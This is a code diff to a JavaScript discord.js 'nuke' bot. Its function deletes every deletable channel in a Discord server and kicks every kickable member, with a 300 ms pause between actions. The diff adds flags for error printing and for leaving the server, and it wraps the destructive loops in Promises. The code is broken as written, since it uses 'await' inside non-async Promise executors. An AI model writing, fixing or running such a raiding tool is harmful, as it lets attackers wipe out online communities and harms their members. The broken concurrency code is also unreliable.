@@ -2,6 +2,10 @@ const djs    = require("discord.js");
 const prompt = require('prompt-sync')({sigint: true});
 
 
+const PRINT_ERROR = true;
+const LEAVE_GUILD = false;
+
+
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 
@@ -47,23 +51,27 @@ const nuke = async g => {
     const channels = g.channels.cache;
 
     try {
-        for (const channel of channels.values()) {            
-            if ("deletable" in channel &&
-                channel.deletable) channel.delete();
+        new Promise(_ => {
+            for (const channel of channels.values()) {            
+                if ("deletable" in channel &&
+                    channel.deletable) channel.delete();
+    
+                await sleep(300);
+            }
+        });
 
-            await sleep(300);
-        }
-
-        for (const member of members.values()) {
-            if (member.kickable) member.kick();
-
-            await sleep(300);
-        }
+        new Promise(_ => {
+            for (const member of members.values()) {
+                if (member.kickable) member.kick();
+    
+                await sleep(300);
+            }
+        });
 
     } catch (e) {
-        console.error(e)
+        if (PRINT_ERROR) console.error(e);
     } finally { 
-        // g.leave() 
+        if (LEAVE_GUILD) g.leave();
     }
 };
 
